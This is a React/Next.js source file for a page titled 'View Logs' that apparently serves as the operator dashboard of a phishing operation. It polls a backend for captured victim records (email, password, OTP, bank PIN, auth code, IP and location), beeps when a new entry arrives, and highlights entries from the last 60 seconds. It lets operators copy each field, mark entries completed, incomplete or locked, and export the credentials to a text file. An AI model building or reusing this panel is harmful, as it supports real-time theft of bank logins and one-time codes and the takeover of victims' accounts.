"use client";
import Seo from "@/shared/layout-components/seo/seo";
import React, { Fragment, useEffect, useState } from "react";
import { Button, Card, Col, Pagination, Row } from "react-bootstrap";
import { deleteAccounts, getAccounts } from "@/shared/Api/dashboard";
import { useDispatch, useSelector } from "react-redux";
import { X, Check, Lock, RotateCcw } from "lucide-react";
import { FaTrash } from "react-icons/fa";
import moment from "moment";
import Success from "@/components/SuccessPop";
import { getDownloadURL, ref } from "firebase/storage";
import { storage } from "@/shared/Api/firebase";
import { usePathname } from "next/navigation";

function CallLogsPage() {
  const dispatch = useDispatch();
  const user = useSelector((state: any) => state.auth.user);
  const accounts = useSelector((state: any) => state.dash.accounts);
  const totalAccountsReducer = useSelector(
    (state: any) => state.dash.totalAccounts
  );
  const beep = useSelector((state: any) => state.dash.beep);
  const pathname = usePathname();

  const [currentPage, setCurrentPage] = useState(1);
  const [totalAccounts, setTotalAccounts] = useState(0);
  const [totalAccountsFromReducer, setTotalAccountsFromReducer] =
    useState(totalAccountsReducer);
  const [limit] = useState(10);
  const [selectedAccounts, setSelectedAccounts] = useState<string[]>([]);
  const [completedAccounts, setCompletedAccounts] = useState<string[]>([]);
  const [inCompleteAccounts, setInCompleteAccounts] = useState<string[]>([]);
  const [locked, setLocked] = useState<string[]>([]);
  const [playableUrl, setPlayableUrl] = useState<string>("");
  const [exportData, setExportData] = useState<any[]>([]);
  const [totalPages, setTotalPages] = useState(1);
  const [open, setOpen] = useState(false);
  useEffect(() => {
    fetchAccounts(currentPage);
    const storedCompletedAccounts = localStorage.getItem("completedAccounts");
    if (storedCompletedAccounts) {
      setCompletedAccounts(JSON.parse(storedCompletedAccounts));
    }
    const storedInCompleteAccounts = localStorage.getItem("inCompleteAccounts");
    if (storedInCompleteAccounts) {
      setInCompleteAccounts(JSON.parse(storedInCompleteAccounts));
    }
    const storedLocked = localStorage.getItem("locked");
    if (storedLocked) {
      setLocked(JSON.parse(storedLocked));
    }
  }, [currentPage]);

  const getDownloadedUrl = async () => {
    const audioRef = ref(storage, "audio/beep.mpeg");

    getDownloadURL(audioRef)
      .then((url) => {
        setPlayableUrl(url);
        // Use the URL to play audio, save it to the database, etc.
      })
      .catch((error) => {
        console.error("Error getting download URL:", error);
      });
  };

  useEffect(() => {
    getDownloadedUrl();
  });

  const handleCompleted = () => {
    const updatedCompletedAccounts = [
      ...completedAccounts,
      ...selectedAccounts,
    ];
    setCompletedAccounts(updatedCompletedAccounts);
    setSelectedAccounts([]);
    localStorage.setItem(
      "completedAccounts",
      JSON.stringify(updatedCompletedAccounts)
    );
  };
  const handleInComplete = () => {
    const updatedInCompleteAccounts = [
      ...inCompleteAccounts,
      ...selectedAccounts,
    ];
    setInCompleteAccounts(updatedInCompleteAccounts);
    setSelectedAccounts([]);
    localStorage.setItem(
      "inCompleteAccounts",
      JSON.stringify(updatedInCompleteAccounts)
    );
  };
  const handleLocked = () => {
    const updatedLocked = [...locked, ...selectedAccounts];
    setLocked(updatedLocked);
    setSelectedAccounts([]);
    localStorage.setItem("locked", JSON.stringify(updatedLocked));
  };

  const handleReset = () => {
    setCompletedAccounts([]);
    setInCompleteAccounts([]);
    setLocked([]);
    localStorage.removeItem("completedAccounts");
    localStorage.removeItem("inCompleteAccounts");
    localStorage.removeItem("locked");
  };

  const playSound = () => {
    const audio = new Audio(playableUrl);
    audio.play().catch((error) => console.error("Error playing sound:", error));
  };

  useEffect(() => {
    if (pathname) {
      if (beep) {
        playSound();
      }
    }
  }, [beep]);
  useEffect(() => {
    const fetchAllAccounts = async (page: number) => {
      const response = await getAccounts(user?._id, page, limit, dispatch);
      setTotalAccounts(response?.totalAccounts);
      setTotalPages(response?.totalPages);
    };
    fetchAllAccounts(currentPage);
    const intervalId = setInterval(() => {
      fetchAllAccounts(currentPage);
    }, 5000);

    return () => clearInterval(intervalId);
  }, [totalAccountsFromReducer, user?._id, limit, currentPage]);

  const handlePageChange = (pageNumber: number) => {
    setCurrentPage(pageNumber);
  };

  const fetchAccounts = async (page: number) => {
    const response = await getAccounts(user?._id, page, limit, dispatch);
    setTotalAccounts(response?.totalAccounts);
    setTotalPages(response?.totalPages);
  };

  const handleDeleteAccount = async (account: any) => {
    await deleteAccounts({ id: account?._id }, dispatch);
    fetchAccounts(currentPage);
  };

  const handleDeleteSelectedAccounts = async () => {
    await Promise.all(
      selectedAccounts.map((id) => deleteAccounts({ id }, dispatch))
    );
    setSelectedAccounts([]);
    fetchAccounts(currentPage);
  };

  const toggleSelectAccount = (accountId: string, account: any) => {
    if (exportData?.length) {
      setExportData([...exportData, account]);
    } else {
      setExportData([account]);
    }
    setSelectedAccounts((prevSelected) =>
      prevSelected.includes(accountId)
        ? prevSelected.filter((id) => id !== accountId)
        : [...prevSelected, accountId]
    );
  };

  const toggleSelectAll = () => {
    if (selectedAccounts.length === accounts.length) {
      setSelectedAccounts([]);
    } else {
      setSelectedAccounts(accounts.map((account: any) => account._id));
      setExportData(accounts);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard
      .writeText(text)
      .then(() => {
        setOpen(true);
        setTimeout(() => {
          setOpen(false);
        }, 1000);
      })
      .catch((error) => {
        alert("Failed to copy: " + error);
      });
  };

  function exportToTxt(filename = "urls.txt") {
    const columnWidths = {
      email: 25,
      password: 20,
      otp: 10,
      bankPin: 10,
      ipAddress: 20,
    };

    const padString = (str: string, length: number) => {
      return str.padEnd(length, " ");
    };

    const headers =
      padString("Email", columnWidths.email) +
      padString("Password", columnWidths.password) +
      padString("Otp", columnWidths.otp) +
      padString("Bank Pin", columnWidths.bankPin) +
      padString("Ip Address", columnWidths.ipAddress) +
      "\n";

    const textContent = accounts
      ?.map(
        (item: any) =>
          padString(item.email || "", columnWidths.email) +
          padString(item.password || "", columnWidths.password) +
          padString(item.otp || "", columnWidths.otp) +
          padString(item.bankPin || "", columnWidths.bankPin) +
          padString(item.location?.ipAddress || "", columnWidths.ipAddress)
      )
      .join("\n");

    const fileContent = headers + textContent;

    const blob = new Blob([fileContent], { type: "text/plain;charset=utf-8;" });
    const link = document.createElement("a");

    const url = URL.createObjectURL(blob);
    link.href = url;
    link.setAttribute("download", filename);
    document.body.appendChild(link);
    link.click();

    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  }
  return (
    <Fragment>
      <Seo title={"logs"} />
      <Success
        isOpen={open}
        title={"Copied!"}
        copied={true}
        description={"Copied to clipboard!"}
      />
      <Row className="mt-2">
        <Col xl={12}>
          <Card className="custom-card">
            <Card.Header className="justify-content-between">
              <Card.Title className="flex gap-2">
                <h1>View Logs</h1>{" "}
                <span className="text-blue-500">{totalAccounts}</span>
              </Card.Title>
              <div className="d-flex flex-wrap gap-2">
                <div className="flex justify-between gap-2">
                  <input
                    className="form-control form-control-sm"
                    type="text"
                    placeholder="Search Here"
                    aria-label=".form-control-sm example"
                  />
                  <div title="Reset">
                    <Button
                      className="btn-lg bg-[#546dfe]"
                      onClick={handleReset}
                    >
                      <RotateCcw size={14} />
                    </Button>
                  </div>
                  <div title="Mark selected as locked">
                    <Button
                      className="bg-[#546dfe] btn-lg"
                      onClick={handleLocked}
                      disabled={selectedAccounts.length === 0}
                    >
                      <Lock size={14} className="hover:text-green-400" />
                    </Button>
                  </div>
                  <div title="Mark selected as Incomplete">
                    <Button
                      className="bg-[#546dfe] btn-lg"
                      onClick={handleInComplete}
                      disabled={selectedAccounts.length === 0}
                    >
                      <X size={14} className="hover:text-red-400" />
                    </Button>
                  </div>
                  <div title="Mark selected as completed">
                    <Button
                      className="bg-[#546dfe] btn-lg"
                      onClick={handleCompleted}
                      disabled={selectedAccounts.length === 0}
                    >
                      <Check size={14} className="hover:text-green-400" />
                    </Button>
                  </div>
                  <div
                    title="Delete selected logs"
                    className="hover:text-red-500 "
                  >
                    <Button
                      className="bg-[#546dfe] btn-lg cursor-pointer"
                      onClick={handleDeleteSelectedAccounts}
                      disabled={selectedAccounts.length === 0}
                    >
                      <FaTrash size={14} className="hover:text-red-400" />
                    </Button>
                  </div>

                  <Button
                    className="bg-[#546dfe] w-[200px] text-nowrap "
                    onClick={() => exportToTxt()}
                    disabled={accounts?.length === 0}
                  >
                    Export
                  </Button>
                </div>
              </div>
            </Card.Header>
            <Card.Body className="p-0">
              <div className="table-responsive">
                <table className="table text-nowrap">
                  <thead>
                    <tr>
                      <th>
                        <input
                          title="select all"
                          className="mt-1"
                          type="checkbox"
                          checked={
                            selectedAccounts?.length === accounts?.length
                          }
                          onChange={toggleSelectAll}
                        />
                      </th>
                      {user?.role == "admin" && <th>User Name</th>}
                      <th>Email</th>
                      <th>Password</th>
                      <th>OTP</th>
                      <th>Current Step</th>
                      <th>Bank Pin</th>
                      <th>Country Flag</th>
                      <th>Auth Code</th>
                      <th>IP Address</th>
                      <th>Date</th>
                      {/* <th>Action</th> */}
                    </tr>
                  </thead>
                  <tbody>
                    {accounts
                      ?.slice()
                      .sort(
                        (a: any, b: any) =>
                          new Date(b.createdAt).getTime() -
                          new Date(a.createdAt).getTime()
                      )
                      .map((account: any) => (
                        <tr
                          key={account._id}
                          className={`
                            ${
                              completedAccounts.includes(account._id)
                                ? "text-green-500"
                                : ""
                            } 
                            ${
                              inCompleteAccounts.includes(account._id)
                                ? "text-red-500"
                                : ""
                            } 
                            ${
                              locked.includes(account._id)
                                ? "text-purple-500"
                                : ""
                            }
                          `}
                        >
                          <td>
                            <input
                              type="checkbox"
                              checked={selectedAccounts.includes(account?._id)}
                              onChange={() =>
                                toggleSelectAccount(account?._id, account)
                              }
                            />
                          </td>
                          {user?.role == "admin" && (
                            <td>{account?.userId?.userName}</td>
                          )}
                          <td>
                            <div className="d-flex">
                              <div
                                className="ms-2"
                                onClick={() => copyToClipboard(account?.email)}
                              >
                                <p className="fs-12 mb-0">{account?.email}</p>
                              </div>
                            </div>
                          </td>
                          <td onClick={() => copyToClipboard(account.password)}>
                            {account.password}
                          </td>
                          <td onClick={() => copyToClipboard(account.otp)}>
                            <span
                              className={`bg-${account?.status?.toLowerCase()}-transparent`}
                            >
                              {account.otp}
                            </span>
                          </td>
                          <td
                            onClick={() => copyToClipboard(account.currentStep)}
                          >
                            <span className="fw-semibold fs-13">
                              {account.currentStep}
                            </span>
                          </td>
                          <td onClick={() => copyToClipboard(account.bankPin)}>
                            <span className="fw-semibold fs-13">
                              {account.bankPin}
                            </span>
                          </td>
                          <td>
                            <img
                              src={`https://flagcdn.com/16x12/${account?.location?.countryCode?.toLowerCase()}.png`}
                              alt={account?.location?.country}
                              width="16"
                              height="12"
                              title={`${account?.location?.country}, ${account?.location?.city}`}
                            />
                          </td>
                          <td onClick={() => copyToClipboard(account.authCode)}>
                            <span className="fw-semibold fs-13">
                              {account.authCode}
                            </span>
                          </td>
                          <td
                            onClick={() =>
                              copyToClipboard(account?.location?.ipAddress)
                            }
                          >
                            {account?.location?.ipAddress}
                          </td>
                          <td>
                            {moment(account?.createdAt).format(
                              "ddd, MMM DD, YYYY, hh:mm A"
                            )}
                          </td>
                        </tr>
                      ))}
                  </tbody>
                </table>
              </div>
            </Card.Body>
            <Card.Footer>
              <div className="d-flex align-items-center">
                <div>
                  Showing {totalAccounts} Entries{" "}
                  <i className="bi bi-arrow-right ms-2 fw-semibold"></i>
                </div>
                <div className="ms-auto">
                  <nav
                    aria-label="Page navigation"
                    className="pagination-style-4"
                  >
                    <Pagination className="pagination mb-0">
                      <Pagination.Item
                        disabled={currentPage === 1}
                        onClick={() => handlePageChange(currentPage - 1)}
                      >
                        Prev
                      </Pagination.Item>
                      {[...Array(totalPages)].map((_, index) => (
                        <Pagination.Item
                          key={index}
                          active={index + 1 === currentPage}
                          onClick={() => handlePageChange(index + 1)}
                        >
                          {index + 1}
                        </Pagination.Item>
                      ))}
                      <Pagination.Item
                        disabled={currentPage === totalPages}
                        onClick={() => handlePageChange(currentPage + 1)}
                      >
                        Next
                      </Pagination.Item>
                    </Pagination>
                  </nav>
                </div>
              </div>
            </Card.Footer>
          </Card>
        </Col>
        <Col xl={12}>
          <Card className="custom-card">
            <Card.Header className="justify-content-between">
              <Card.Title>View last 60 seconds</Card.Title>
            </Card.Header>
            <Card.Body className="p-0">
              <div className="table-responsive">
                <table className="table text-nowrap">
                  <thead>
                    <tr>
                      {/* <th>
                        <input
                          title="select all"
                          className="mt-1"
                          type="checkbox"
                          checked={
                            selectedAccounts?.length === accounts?.length
                          }
                          onChange={toggleSelectAll}
                        />
                      </th> */}
                      <th>Country Flag</th>
                      <th>IP Address</th>
                      <th>Date</th>
                    </tr>
                  </thead>
                  <tbody>
                    {accounts
                      ?.filter((account: any) => {
                        // Check if the account was created in the last 60 seconds
                        const now = Date.now();
                        const createdAt = new Date(
                          account?.createdAt
                        ).getTime();
                        return now - createdAt <= 60000; // 60 seconds = 60000 milliseconds
                      })
                      ?.map((account: any) => (
                        <tr
                          key={account._id}
                          className={`
                ${
                  completedAccounts.includes(account._id)
                    ? "text-green-500"
                    : ""
                } 
                ${
                  inCompleteAccounts.includes(account._id) ? "text-red-500" : ""
                } 
                ${locked.includes(account._id) ? "text-purple-500" : ""}
              `}
                        >
                          {/* <td>
                            <input
                              type="checkbox"
                              checked={selectedAccounts.includes(account._id)}
                              onChange={() =>
                                toggleSelectAccount(account._id, account)
                              }
                            />
                          </td> */}
                          <td>
                            <img
                              src={`https://flagcdn.com/16x12/${account?.location?.countryCode?.toLowerCase()}.png`}
                              alt={account?.location?.country}
                              width="16"
                              height="12"
                              title={`${account?.location?.country}, ${account?.location?.city}`}
                            />
                          </td>
                          <td
                            onClick={() =>
                              copyToClipboard(account?.location?.ipAddress)
                            }
                          >
                            {account?.location?.ipAddress}
                          </td>
                          <td>
                            {moment(account?.createdAt).format(
                              "ddd, MMM DD, YYYY, hh:mm A"
                            )}
                          </td>
                        </tr>
                      ))}
                  </tbody>
                </table>
              </div>
            </Card.Body>
            {/* <Card.Footer>
              <div className="d-flex align-items-center">
                <div>
                  Showing {totalAccounts} Entries{" "}
                  <i className="bi bi-arrow-right ms-2 fw-semibold"></i>
                </div>
                <div className="ms-auto">
                  <nav
                    aria-label="Page navigation"
                    className="pagination-style-4"
                  >
                    <Pagination className="pagination mb-0">
                      <Pagination.Item
                        disabled={currentPage === 1}
                        onClick={() => handlePageChange(currentPage - 1)}
                      >
                        Prev
                      </Pagination.Item>
                      {[...Array(totalPages)].map((_, index) => (
                        <Pagination.Item
                          key={index}
                          active={index + 1 === currentPage}
                          onClick={() => handlePageChange(index + 1)}
                        >
                          {index + 1}
                        </Pagination.Item>
                      ))}
                      <Pagination.Item
                        disabled={currentPage === totalPages}
                        onClick={() => handlePageChange(currentPage + 1)}
                      >
                        Next
                      </Pagination.Item>
                    </Pagination>
                  </nav>
                </div>
              </div>
            </Card.Footer> */}
          </Card>
        </Col>
      </Row>
    </Fragment>
  );
}

export default CallLogsPage;
